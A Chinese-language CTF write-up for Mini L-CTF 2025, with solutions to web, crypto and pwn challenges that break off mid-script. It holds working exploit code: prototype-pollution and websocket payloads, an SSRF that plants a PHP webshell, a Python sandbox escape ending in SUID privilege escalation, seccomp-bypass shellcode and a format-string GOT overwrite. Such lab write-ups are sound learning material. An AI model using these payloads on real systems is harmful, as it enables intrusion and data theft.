---
title: Mini-L CTF 2025 WriteUp by 不知道
date: 2025-05-09 13:13:44
tags: [cry,web,re,pwn,misc]
categories: wp
typora-root-url: ./..
---

# Mini L-CTF 2025

队名：不知道

排名：2

![](/images/HhJZb2AR1ofldixqdwocJDWAnAb.png)

## Web

### Clickclick

分析源代码，发现每 100 下对 `/update-amount` 发送一个 json

```json
{"type":"set","point":{"amount": 100}}
```

但是事实上到 amount1000 就不让过了

看到源码提示如果是 null/0 会删除 amount 键

那么我们污染一下让他后面正常读取即可

exp

```python
def web3():
    payload = {"type":"set","point":{"amount":None,"__proto__": {"amount": 100000}}}
    resp = requests.post(base+"/update-amount", json=payload).text
    print(resp)
```

> 神神秘秘的黑盒

### GuessOneGuess

注意到 punishment-response 中，data.score 可以自行构造

![](/images/OKW0bgqr4oVlrNxKSLjcvsXVnze.png)

制造 +Infinity 溢出

打开控制台，人工发包

```json
const socket = io();socket.emit("punishment-response", { score: -1.7976931348623157e308} );socket.emit("punishment-response", { score: -1.7976931348623157e308} );
```

然后就是一通猜，猜到就领 flag（结果可在 f12-network 里面刚刚构建的 ws 连接看到）

```json
socket.emit('guess', { value: 50 });
```

### Miniup

先图片填 `index.php` 读源码

```php
<?php
$dufs_host = '127.0.0.1';
$dufs_port = '5000';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        
        $filename = $file['name'];

        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        
        $file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        
        if (!in_array($file_extension, $allowed_extensions)) {
            echo json_encode(['success' => false, 'message' => '只允许上传图片文件']);
            exit;
        }
        
        $target_url = 'http://' . $dufs_host . ':' . $dufs_port . '/' . rawurlencode($filename);
        
        $file_content = file_get_contents($file['tmp_name']);
        
        $ch = curl_init($target_url);
        
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $file_content);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: ' . $dufs_host . ':' . $dufs_port,
            'Origin: http://' . $dufs_host . ':' . $dufs_port,
            'Referer: http://' . $dufs_host . ':' . $dufs_port . '/',
            'Accept-Encoding: gzip, deflate',
            'Accept: */*',
            'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Content-Length: ' . strlen($file_content)
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        curl_close($ch);
        
        if ($http_code >= 200 && $http_code < 300) {
            echo json_encode(['success' => true, 'message' => '图片上传成功']);
        } else {
            echo json_encode(['success' => false, 'message' => '图片上传失败，请稍后再试']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '未选择图片']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'search') {
    if (isset($_POST['query']) && !empty($_POST['query'])) {
        $search_query = $_POST['query'];
        
        if (!ctype_alnum($search_query)) {
            echo json_encode(['success' => false, 'message' => '只允许输入数字和字母']);
            exit;
        }
        
        $search_url = 'http://' . $dufs_host . ':' . $dufs_port . '/?q=' . urlencode($search_query) . '&json';
        
        $ch = curl_init($search_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: ' . $dufs_host . ':' . $dufs_port,
            'Accept: */*',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code >= 200 && $http_code < 300) {
            $response_data = json_decode($response, true);
            if (isset($response_data['paths']) && is_array($response_data['paths'])) {
                $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
                
                $filtered_paths = [];
                foreach ($response_data['paths'] as $item) {
                    $file_name = $item['name'];
                    $extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
                    
                    if (in_array($extension, $image_extensions) || ($item['path_type'] === 'Directory')) {
                        $filtered_paths[] = $item;
                    }
                }
                
                $response_data['paths'] = $filtered_paths;
                
                echo json_encode(['success' => true, 'result' => json_encode($response_data)]);
            } else {
                echo json_encode(['success' => true, 'result' => $response]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => '搜索失败，请稍后再试']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '请输入搜索关键词']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'view') {
    if (isset($_POST['filename']) && !empty($_POST['filename'])) {
        $filename = $_POST['filename'];
        
        $file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));
        
        if ($file_content !== false) {
            $base64_image = base64_encode($file_content);
            $mime_type = 'image/jpeg';
            
            echo json_encode([
                'success' => true, 
                'is_image' => true,
                'base64_data' => 'data:' . $mime_type . ';base64,' . $base64_image
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => '无法获取图片']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '请输入图片路径']);
        exit;
    }
}
?>
```

注意到这行代码

```php
$file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));
```

`file_get_contents` 的参数可由 `$_POST['options']` 控制，打 ssrf 攻击 dufs 进行上传 webshell 即可，最后 rce 读 env

```python
def web2():
    payload = "<?php system($_GET['cmd']); ?>"
    resp = requests.post(base+"/index.php", data={
        "action": "view",
        "filename": "http://127.0.0.1:5000/shell.php",
        "options[http][method]": "PUT",
        "options[http][content]": payload,
        "options[http][header]": "Host: 127.0.0.1:5000\nContent-Length: {}\n".format(len(payload)),
    }).json()
    print(resp)
    resp = requests.get(base+"/shell.php?cmd=env").text
    print(resp)
```

### PyBox

很有意思一道题

先看看这题干了什么：

1. 过滤了一堆字符 `badchars = "\"'|&`+-*/()[]{}_."` 看似不可能打得了
2. AST 审计黑名单 `"__class__", "__dict__", "__bases__", "__mro__", "__subclasses__","__globals__", "__code__", "__closure__", "__func__", "__self__","__module__", "__import__", "__builtins__", "__base__"`
3. builtins 删的只剩下 `print` `filter` `list` `len` `addaudithook` `Exception`
4. 加了一个白名单 audithook

我们一个个来，首先第一个，我们注意到执行前有这样一步操作

```python
code = code.encode().decode('unicode_escape')
```

那很好了，payload 套一层 unicode 秒了黑名单

第二个审计黑名单，注意到 `__getattribute__` 没被 ban，可以使用它作为获取子 attribute 的工具，先留着

然后 audithook 怎么绕呢，注意到它是这么判断的：

```python
if not list(filter(lambda x: event == x, allowed_events)):
    raise Exception
if len(args) > 0:
    raise Exception
```

那很好了，我劫持 list/filter 和 len 不就行了

那我们首先得获取 globals，通过 `__getattribute__` 直接拿 `__globals__`

```python
g = my_audit_checker.__getattribute__('__globals__')
```

然后劫持两个内置函数

```python
g["__builtins__"]["list"] = lambda x: ["a"]
g["__builtins__"]["len"] = lambda x: 0
```

至此，audithook 被致盲

然后怎么办？完全逃不出去啊

注意到 builtins 还有个 Exception 可以用

那么我们可以拿到一个 traceback：

```python
try:
    raise Exception()
except Exception as e:
    tb = e.__traceback__
```

现在，我们只需要利用栈帧逃逸，逃到 exec 外部拿到真正的 globals 即可！

```python
try:
    raise Exception()
except Exception as e:
    tb = e.__traceback__
    frame = tb.tb_frame
    while frame.f_back:
        frame = frame.f_back
    globals = frame.f_globals
```

然后就直接 import，rce 了（由于限制输出，得一个一个来）

```python
builtins = globals["__builtins__"]
res = builtins['__import__']('subprocess').getoutput('cat /m1* | base64 -w 0 | cut -c {}')
print(res[0].strip())
```

结束了吗？

你会发现并没有输出

那很好了，继续

`ls -l` 发现 flag 限制为 root 可读，需要提个权

find 一下 suid 发现 find 具有

给他改一下权限

```bash
find /etc/passwd -exec chmod 777 /m1* \;
```

正常读 flag 即可

> PyBox 做完去做 Jail？真的假的？

## Crypto

### babaisiginsigin

```python
import random
import socket
import threading
import os

def calculate_level1(_m_, _x_, _y_):
    return (_m_ | _x_) + (_m_ | _y_)

def calculate_level2(_m_, _x_, _y_):
    return (_m_ | _x_) + (_m_ ^ _y_)

def level(_conn_, _calculate_, _x_, _y_, _guess_, _description_, _test_times_):
    for _ in range(_test_times_):
        _conn_.sendall(b"Enter your number: ")
        
        # 设置 5 秒超时
        _conn_.settimeout(5)
        
        try:
            data = _conn_.recv(1024)
            if not data:
                return False
            try:
                test = int(data.strip())
            except:
                _conn_.sendall(b"Invalid input. Bye.\n")
                return False
            result = _calculate_(test, _x_, _y_)
            _conn_.sendall(f"Calculation result: {result}\n".encode())
        except socket.timeout:
            _conn_.sendall(b"Time out! Respond in 5 seconds.\n")
            return False

    _conn_.sendall(f"\nNow, guess the result of {_description_} for m = {_guess_}:\n".encode())
    
    # 设置 5 秒超时
    _conn_.settimeout(5)
    
    try:
        data = _conn_.recv(1024)
        if not data:
            return False
        try:
            user_guess = int(data.strip())
        except:
            _conn_.sendall(b"Invalid input. Bye.\n")
            return False

        correct_result = _calculate_(_guess_, _x_, _y_)
        if user_guess == correct_result:
            _conn_.sendall(b"Correct! Proceeding to next level...\n\n")
            return True
        else:
            _conn_.sendall(b"Wrong guess! Exiting...\n")
            return False
    except socket.timeout:
        _conn_.sendall(b"Time out! You took too long to respond.\n")
        return False

def handle_client(_conn_, _addr_, _flag_):
    _conn_.sendall(b"Welcome to Puzzle!\n\n")
    try:
        # Level 1
        x = random.getrandbits(30)
        y = random.getrandbits(30)
        guess = random.getrandbits(30)
        _conn_.sendall(b"Level 1:\n")
        if not level(_conn_, calculate_level1, x, y, guess, "(m | x) + (m | y)", _test_times_=2):
            _conn_.close()
            return

        # Level 2
        x = random.getrandbits(30)
        y = random.getrandbits(30)
        guess = random.getrandbits(30)
        _conn_.sendall(b"Level 2:\n")
        if not level(_conn_, calculate_level2, x, y, guess, "(m | x) + (m ^ y)", _test_times_=2):
            _conn_.close()
            return

        # 通关，发flag
        _conn_.sendall(f"Congratulations! You've passed all levels!\nHere is your flag: {_flag_}\n".encode())
    except Exception as e:
        _conn_.sendall(b"An error occurred. Bye.\n")
    finally:
        _conn_.close()

def main():
    host = "0.0.0.0"
    port = 2227

    flag = os.getenv('FLAG', 'flag{testflag}')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"[+] Listening on {host}:{port}")

    while True:
        conn, addr = s.accept()
        threading.Thread(_target_=handle_client, _args_=(conn, addr, flag)).start()

if __name__ == "__main__":
    main()
```

两个挑战，分别是(_m_ | _x_) + (_m_ | _y_)和(_m_ | _x_) + (_m_ ^ _y_)，有两次输入自选 m 的机会。

第一个传入 0 时会得到 x+y，只用两次无法得到全部的位信息，可以 z3 求解一个与结果相同的值

第二个只要传全 0 和全 1 即可得到 x+y 和 y^0x3FFFFFFF+0x3FFFFFFF

直接解即可

```python
from pwn import *
from z3 import *

context.log_level = 'debug'
REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 35813

sh=remote(REMOTE_HOST,REMOTE_PORT)

sh.recvuntil(b'r: ')
# lv1_m1=int('101010101010101010101010101010',2)
lv1_m1=0
sh.sendline(str(lv1_m1).encode())
lv1_re1=int(sh.recvline().decode().split(' ')[2].strip('\n'))
print(lv1_re1)

sh.recvuntil(b'r: ')
lv1_m2=int('101010101010101010101010101010',2)
# lv1_m2=2
sh.sendline(str(lv1_m2).encode())
lv1_re2=int(sh.recvline().decode().split(' ')[2].strip('\n'))
print(lv1_re2)

m1=int(sh.recvuntil(b':').decode().split(' = ')[1][:-1])
print(m1)

x=BitVec('x',30)
y=BitVec('y',30)
zlm1=BitVecVal(lv1_m1,30)
zlm2=BitVecVal(lv1_m2,30)
s1=Solver()
s1.add(lv1_re1 == (zlm1|x)+(zlm1|y))
s1.add(lv1_re2 == (zlm2|x)+(zlm2|y))

print('-------------')
print(s1.check())
print(s1.model())
x1=s1.model()[x].as_long()
y1=s1.model()[y].as_long()
print(x1,y1)
print('-------------')
v1=(m1|x1)+(m1|y1)
sh.sendline(str(v1).encode())

sh.recvuntil(b'r: ')
# lv1_m1=int('101010101010101010101010101010',2)
lv2_m1=0
sh.sendline(str(lv2_m1).encode())
lv2_re1=int(sh.recvline().decode().split(' ')[2].strip('\n'))
print(lv2_re1)

sh.recvuntil(b'r: ')
lv2_m2=0x3FFFFFFF
# lv1_m2=2
sh.sendline(str(lv2_m2).encode())
lv2_re2=int(sh.recvline().decode().split(' ')[2].strip('\n'))
print(lv2_re2)

m2=int(sh.recvuntil(b':').decode().split(' = ')[1][:-1])
print(m2)

y2=(lv2_re2 - 0x3FFFFFFF)^0x3FFFFFFF
x2=lv2_re1-y2

v2=(m2|x2)+(m2^y2)
sh.sendline(str(v2).encode())

sh.interactive()
```

### **rsasign**

```python
from Crypto.Util.number import bytes_to_long, getPrime, inverse
from secret import flag

def genKeys(_nbits_):
    e = 0x10001
    p = getPrime(_nbits_ // 2)
    q = getPrime(_nbits_ // 2)
    n = p * q
    phi = n - (p + q) + 1
    d = inverse(e, phi)
    pubkey = (n, e)
    prikey = (d, p, q)
    
    return pubkey, prikey

def encrypt(_msg_, _pubkey_):
    m = bytes_to_long(_msg_)
    n, e = _pubkey_
    c = pow(m, e, n)
    return c

def get_gift(_prikey_):
    a = bytes_to_long(b'miniL')
    b = bytes_to_long(b'mini7')
    p, q = _prikey_[1:]
    phi = (p - 1)*(q - 1)
    giftp = p + a
    giftq = q + b
    gift = pow((giftp + giftq + a*b), 2, phi)
    return gift >> 740

if __name__ == "__main__":
    nbits = 1024
    pubkey, prikey = genKeys(nbits)
    c = encrypt(flag, pubkey)
    gift = get_gift(prikey)
    with open('output.txt', 'a') as f:
        f.write('pubkey = ' + str(pubkey) + '\n')
        f.write('c = ' + str(c) + '\n')
        f.write('gift = ' + str(gift) + '\n')
```

gift = pow((giftp + giftq + a*b), 2, phi)=(p+q+a+b+ab)^2 %phi

数量级主要来自(p+q)^2 与 phi 数量级相当，低位隐藏较多，可以直接用 n 代替 phi，解得(p+q)的高位。

然后联立解得 p 高位，copper 即可，注意参数调教

```python
from Crypto.Util.number import *

def get_gift(_prikey_):
    a = bytes_to_long(b'miniL')
    b = bytes_to_long(b'mini7')
    p, q = prikey[1:]
    phi = (p - 1)*(q - 1)
    giftp = p + a
    giftq = q + b
    gift = pow((giftp + giftq + a*b), 2, phi)
    return gift >> 740

pubkey = (65537,103894244981844985537754880154957043605938484102562158690722531081787219519424572416881754672377601851964416424759136080204870893054485062449999897173374210892603308440838199225926262799093152616430249061743215665167990978654674200171059005559869946978592535720766431524243942662028069102576083861914106412399)
c = 50810871938251627005285090837280618434273429940089654925377752488011128518767341675465435906094867261596016363149398900195250354993172711611856393548098646094748785774924511077105061611095328649875874203921275281780733446616807977350320544877201182003521199057295967111877565671671198186635360508565083698058
gift = 2391232579794490071131297275577300947901582900418236846514147804369797358429972790212
e=pubkey[0]
n=pubkey[1]

a = bytes_to_long(b'miniL')
b = bytes_to_long(b'mini7')
X=a+b+a*b
gift=gift*2**740

PR.<_x_> = _PolynomialRing_(RealField(1000))

for i in range(30):
    pqh=_int_(sqrt(gift+i*n))

    f=pqh*x-n-x^2
    root=f.roots()
    if len(root)==0:
        continue
    print(root)
    ph=_int_(root[1][0])>>226<<226

    PR.<_y_> = _PolynomialRing_(Zmod(n))
    f=ph+y

    res=f.small_roots(_X_=2**230,_beta_=0.49, _epsilon_=0.04)
    if res and res[0]!=0:
        p=_int_(res[0])+ph
        print(res,p)
        break

q=n//p
print(q)

phi=(p-1)*(q-1)
d=inverse(e,phi)
print(long_to_bytes(pow(c,d,n)))
```

### **ezhash？！**

```python
from Crypto.Util.number import*
import random
import string
from secret import flag,key

def shash(_value_,_key_):
    assert type(_value_) == str
    assert type(_key_) == int
    length = len(_value_)

    if length == 0:
        return 0
    mask = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    x = (ord(_value_[0]) << 7) & mask
    for c in _value_:
        x = (_key_ * x) & mask ^ ord(c)
        # x=x*key-c % mask

    x ^= length & mask

    return x

def get_test(_key_):

    testvalue = []
    testhash = []

    for i in range(64):
        a = ''.join(random.choices(string.ascii_letters + string.digits, _k_=32)) 
        testvalue.append(a)
        testhash.append(shash(a,_key_))

    return testvalue,testhash

if __name__ == "__main__":
    assert len(flag) == 32
    assert type(flag) == str
    testvalue,testhash = get_test(key)
    shash = shash(flag,key)
    with open('output.txt', 'a') as f:
        f.write('testvalue = ' + str(testvalue) + '\n')
        f.write('testhash = ' + str(testhash) + '\n')
        f.write('shash = ' + str(shash) + '\n')
```

shash 过程 &mask = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 相当于 模 2**280

由于是模 2 的指数下的，可以逐位恢复 key

接下来根据

![](/images/NkZsbNDRgoznCsxR2e7c1PivnzL.png)

造格求解即可

```python
from Crypto.Util.number import *

testvalue = ['tx4QYfj3lCTABrCoMsh3PPvQIM7dmIIw', 'jKLrKVRVpjjyrchL41IjMVkQMgSkyyig', 'fdbfg4185rfRJyhwCwc2flhmsCDuVOe8', 'ZL8h1XOKVNXkVh1ZcCHhDUvF4FO96139', 'HcDKLC1iMwoiWoGxaC5VNC78VHLt5JOI', 'GzGJsONsN8GSZxh6C89w0nzRiTaR3tkj', 'Qcc9vqEBGXYd8sZ3E94Ode6ChC3U53x7', 'kABKm4mE7AttOzac3eBXvIxKE9Ve0viT', 'IkxnSW31AuUGpVldXGopAxfzr5eTXc2u', 'rJ2LZ0uDPCWEwJzaGGalaWWHBbxrLH4h', 'bOlXdB5xVb2RQO0MAhLvzgOZpEo2hIdP', 'gRhoDgyxFFV5kBLwZxexhoHNd5BD81UE', 'Ij86fy7zhVOaapV76xI71IUC8utF6Ct6', 'T055KPGIWKhNIEPxAKW4MLMbmWDvEnLb', 'SQSSYTFryov8Bp1ckfjbUTTV8H3Z3Dr7', 'AzfvT7z8NXJ9u8ID6vgJ8Zml58F2k0iF', 'o3nEYw9XaNzgetmmwypTU7oePU04Tkhc', 'B44YjfhqOrlPg8XQJq2fhWEoGaCijfsc', 'b7cvfUfjvorVjDBW6DiXrZc3eBqx98Ro', '9MwfbmLtdmRRt0TONZ4zmd6NN7z7V8Eg', '2f7I0f65nopjOpIZzErAoqYSGl0tMo0x', 'PqvrJ3FmEuJh1ASIQ06RyYCXbe6426CY', 'c3C60OTDrIs5ZChP2hTAYvViDw43ARCK', 'D6a0NJ2JpwtTBCRJdw1DcXntMgRRyj2A', 'gJ0rEL4zyy8A6aKZ1H3N46rsQnY6UGGx', 'CD19v37d2jHu9YZMp20h70sm1Q3t1yOm', '7vt0C1SCNvPBqBm0YrJffbeLG8vS8388', 'o2KRrZQJLD7CMuLzlPJoJHXwVOHEanBi', 'Lm8I9m5ikXVrguEUFKw6yIc9QWnLwisx', 'kt9H0IDCsjCfqkR83aHD8D23jXq55q5K', 'HsXBVD2dMVTScHfgwAeNsqHkLCWuuaVn', 'QnkXRLGjzfh16icAVidcW4kVx1LEOv0j', '29dQWe0QWOxNAhv48Lfnv8II4IZqeUh1', 'E9Hj5zUhGXUfrNJRmhxF0KfBq0wSjX0i', 'mEc57IdmvliXneKStFzb3pAnNNm4UHbh', 'TvRZb6btVQeKXsO5iVuRCdz3A4ORZ5yQ', 'yOfrPTw9Vkd0P7kiijnGVYL4SogWF7cY', 'GNI7o11w4RyXYY2hnxdq1mAeVPrppkRc', 'YCMxUi7OcB5xozjTg09xXbJvwM6U4apy', '0g6ItBFoe3174e7wpEaEgoid0rixLHBs', 'bsyXlUGPUnQjoNwQLROwrA2SCkbDR1k5', 'CMNSNW3fU14ibZgL0ifWrA0xbbq7Yrks', 'VHfbRmzF9mzGCbYySdljWWo08IVCmAMZ', 'SLfmmSZ5TjDc4ZfKIB2gOVf9KIH2jDUi', 'YKTagkUhZjI0gMyaE1YjVJdCYtPGPZge', 'kCVhCGvjedxC44BlTqQryGdMliYqYrIz', 'HflxuwlJZ2rByOnv995gpXz03ZK6MLW2', '8Yy45IMlpMhDO3CFVhr5f0iRBnNuj3ut', 'Ydae2l7kt1O6mCIBRwjr6TWn6fLRHXjf', '3cLGeEXfyLnrL0ZkvgSEAbDBYgaFNFxB', '97xOFim3lkwqrWM1BqQ7c8mYo5S5TxkC', 'U1EgvNhZz3M8Hg38FsuBVG0PvuWiCfez', '1elLy7dgdfEtb2XyZMxaU6h8dGjfokjv', 'FlSHFSs2SeKNOUVAprkHdtD2FrIPUGIR', 'Bu1pVMZ5QqMmvBTdUt4IwsTpkclqwQKF', 'BPzJvHHDTAu23xBS1wVButTF7lU0JGoo', '6xje2blSl3QwGeV9D4pUmxMKJDqpyXpt', 'F2DkyxkRcHotO6i5MVUKzzDsxV2F69wh', 'kvSYBqmZNppDfweere2A8co50Tv85c4m', '9k5gxX8oz1WmVLtCcN4SdFIse2FizYDU', 'BJ2PCD5KgukjFWntZ3VSjcHJzIZprno2', 'Lyw9EacIjF6j6de3e5wFRQLdzrOfQoAR', 'egf9LJLJrWDIrtnsHZ4XRgoPTXNsz91a', 'Y3ptIW83Rwtny4kng2lCEAYQyPrSIXWl']
testhash = [139452903649273495774796570198749847935154848275416989998236609393670079561796026566, 1898315960650462382992557075551445244853390783794354772475023552166352399126801574913, 1548283380348601157365276865178627465508293067676981633220766480841355279423253644108, 923519463377078549688929962730292019193308698763374121309865664233390770048594933085, 1756902502089018688726236312608077708484907801835749190713532913735823397112051091188, 485883566823442644293538461674550566921074196968613685770142417532151624958507107972, 1173292014155884160226339046019271687659068020981556335907768031140876583959335792191, 1497598230931219654402725391331476099708291441530945577907300933091011484442911623559, 405254852716971084666570344588562007424273706832802434925282540786042396564117859893, 1394088214004563872208003758992014976825245306078851263986862009024422531466462221196, 1763510459716348629512798257958014024443432479861579028783119470126357343664438877507, 27569271776233701581922903599984775754217802504994237075390721310066121958700422257, 358721799072196562200934505713368644637409165736588969777736471282788507457480492393, 393768200956019495628870433474843666326783653588854234548113046584760291662872350533, 1807499005738194381232046747643492968233097104171420081977957810644000450496758434126, 1128375044917910760907836056160281710737671148936596789317429758098492329675588054412, 190801904376187850882600897701548299608718300961575858190394579710450430805489346060, 696235869802737571933351613461601576350495964954926712734858661433694663819119664403, 144629031178782625524039663692148786536912021223673544659451459599242746855791775856, 401144481698447351083363386545760097487182143265029898145794033656496473914256697335, 1009618288798575771577716476700225261222418219966898563557126734083036472365735018549, 1652157599124169823165290864340613818899678030477803381010155627950330279311151902666, 1870720516435595720338243705356357230346778004770545711499635272857342051185669675206, 1487151272734883591621339384743729579702945226647848932314811332859011211687393769612, 1479191883622650407012568261078896124452298448888937784127270669623167501587692263629, 780856915459110484827869192135025240964695263399685896704373351690074659693517658597, 1272702898194178848480618231703540760239057875392727193937165056708655804663623414520, 1275195323347307250910668562396243097983325652451465111552014287378408554253858874273, 1698673537783777278793781484130287999078310462163146951845044095951885080758156044986, 1116043791065172596267818286071095315966453133595258493434104767743854595678117184595, 1348107024738703857635485943338711096444282613588540975344171990396347335813147110414, 674079263421647723071324170291511267338891718494055820365382788749002205059725239586, 295061829951102865059369162125524442985720861319812067484094160955682413284464056261, 1538215242227433291697344636690665676070219615083515667029553094023114463154050936814, 721505087135717334627356208457079819823654955152265437431617001188458058923464437209, 1829121734506718678607427505722187801463532440435031915402835074237985549711879794153, 641638098138302116745154827833695010970508819483215023447636503844550651793330508318, 578773085269354102367810984562000052879291442293349350198300750627238557013515250567, 1037095172573176620769108515135124799537948207093565906631598569276504664097088051993, 1135701773556587743998667090148858666225101588783019121910187176364233349468967967460, 558240645642302963325581107204211662019896908316831899444935081810819489268610165950, 1058477746525469710567689847282850794170250650192794892415352733735415750154044535539, 1078948952548590509616082107408254715684287170445966544383750373684441181406075608800, 1125503915235599245173592373330463888468814720113318696411329986853859005519154551245, 620937641933659718470519231175003762666892925875327642171561741417944681106496958467, 1606192912497675735832389346699475593863960301930109653069662356606234973780336341534, 1080665036256326887412273484626209788664633047255179233142423471463514811554155351816, 983009583253660084055702843297933007090244160053834934015802835528599935867335658914, 483554778736863191047830758397092863562079726548422384268968936073701177390747179894, 1448392838363784830874780455853191313920717249664981009097361707739423512768919183176, 1485175804980546607220269493098915446350406205462077528986751407380405658199537322034, 645127338301455578293193215328875283422934699182904112612610112081929081505533458304, 1809012351380435986646710932772127842855528298763939575266488725018536037784342688529, 1204732789391044629328843397205785308919820285525150764490536624969971871178313643864, 577072907834194443039001358264806817627199891744275024388326836994220595931009773412, 4850110449540994875278068624822977611188629104877448016749725577673217396499782282, 1431458221917644050146055837804453915809781510516096707298405324221753990760039183190, 997966793625232984798176686099411790420209217223783698909939651134351713786805317998, 1663286211430268448119727051818073243067649643181675027323547282932628837598336996456, 1864894557154744961308146774304105483911867578158330607820790060568575114233028842003, 345822843952211153189889023070066136116424104740167243049994988868945364800740535124, 803699468991667968627856232995969437316168483382073633967569490433608395707635458855, 1700532832517222239684444041937412551935144886911006116260771516969538181780787023704, 351624945474123146509460066647337532150453362002844376810733781394757015795554947704]
shash = 463802484547898091835999726502006552543022358314700124374789687370275467670717610329

def shash(_value_,_key_):
    assert _type_(value) == _str_
    assert _type_(key) == _int_
    length = len(value)

    if length == 0:
        return 0
    mask = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    x = (ord(value[0]) << 7) & mask
    for c in value:
        x = (key * x) & mask ^^ ord(c)
        # x=x*key-c % mask

    x ^^= length & mask

    return x

def get_test(_key_):

    testvalue = []
    testhash = []

    for i in range(64):
        a = ''.join(random.choices(string.ascii_letters + string.digits, _k_=32)) 
        testvalue.append(a)
        testhash.append(shash(a,key))

    return testvalue,testhash

def bit_hash(_value_,_key_,_bits_):
    length = len(value)
    if length == 0:
        return 0
    mask = 2**bits-1
    x = (ord(value[0]) << 7) & mask
    for c in value:
        x = ((key * x)& mask)^^ord(c)  & mask

        # x=x*key-c % mask
    x ^^= length & mask

    return x

def get_key(_key_,_bits_):
    print(key , bits)

    if shash(testvalue[0],_int_(key)) == testhash[0] or bits == 280:
        print(0,bin(key)[2:],bits)
        return key

    if any( bit_hash(testvalue[index],key,bits + 1) != testhash[index] & (2**(bits+1)-1) for index in range(len(testvalue)) ):
        print(1,bin(key)[2:],bits)
        key=key+ 2**bits
        

    if any( bit_hash(testvalue[index],key+2**bits,bits + 1) != testhash[index] & (2**(bits+1)-1) for index in range(len(testvalue)) ):
        print(2,bin(key)[2:],bits)
    
    

    return get_key(key,bits+1)

key=get_key(0,0)
print(key)
```

## Pwn

### Ex-Aid lv.2

```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x00000149  if (A != pkey_mprotect) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

打 open+sendfile

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
io=remote("127.0.0.1", 34153)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)


#debug("break *main+326\nc")

sc1=asm("""
mov eax, 0x67616C66
push 0
push rax
push rsp
pop rdi
lea r9, [rip+11-0x1c+0x20]
call r9
""")


sc2=asm("""
xor rsi, rsi
xor rdx, rdx
mov eax, 2
syscall
lea r9, [rip+11+6+2-7]
call r9
""")

sc3=asm("""
mov rsi, rax
mov edi, 1
mov r10, 0x100
mov eax, 0x28
syscall

""")


s(sc1)
s(sc2)
s(sc3)


shell()
```

### PostBox

用格式化修改循环次数，之后把 write got 改为后门

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
io=remote("127.0.0.1", 39687)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)

p="A"*(764-12)+"X"*8+"A"*4+p64(114514)

sl("2")
sla("contents:", p)

p="%14$p-%7$n"
#debug()
sla("contents:", p)

ru("0x")
pie=int(ru("-"), 16)-0x3df0
